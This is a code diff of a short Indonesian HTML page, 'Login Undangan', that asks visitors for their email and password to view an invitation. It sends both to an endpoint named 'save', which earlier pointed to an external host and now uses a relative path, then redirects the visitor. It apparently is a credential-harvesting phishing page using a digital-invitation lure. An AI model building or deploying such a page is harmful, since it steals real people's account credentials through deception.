@@ -1,94 +1,39 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
   <title>Login Undangan</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f6f9;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: #fff;
-      padding: 20px 25px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      width: 350px;
-      text-align: center;
-    }
-    h2 {
-      margin-bottom: 20px;
-      color: #333;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 14px;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: teal;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 15px;
-    }
-    button:hover {
-      background: #006666;
-    }
-    #message {
-      margin-top: 10px;
-      color: red;
-      font-weight: bold;
-    }
-  </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Login untuk melihat Undangan</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="Masukkan Email" required />
-      <input type="password" id="password" placeholder="Masukkan Password" required />
-      <button type="submit">Login</button>
-      <p id="message"></p>
-    </form>
-  </div>
+  <h2>Login untuk melihat Undangan</h2>
+  <form id="loginForm">
+    <input type="email" id="email" placeholder="Email" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Login</button>
+  </form>
+  <p id="message" style="color:red;"></p>
 
   <script>
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
-
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
-      const message = document.getElementById("message");
 
       try {
-        const res = await fetch("https://back-production-87ee.up.railway.app/api/simpan", {
+        const res = await fetch("/api/simpan", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, password }),
+          body: JSON.stringify({ email, password })
         });
 
         const data = await res.json();
-
         if (data.success) {
-          window.location.href = "undangan.html";
+          window.location.href = data.redirect;
         } else {
-          message.innerText = "Login gagal: " + data.message;
+          document.getElementById("message").innerText = data.message;
         }
-      } catch (error) {
-        message.innerText = "❌ Gagal menghubungi server";
+      } catch (err) {
+        document.getElementById("message").innerText = "Gagal menghubungi server";
       }
     });
   </script>
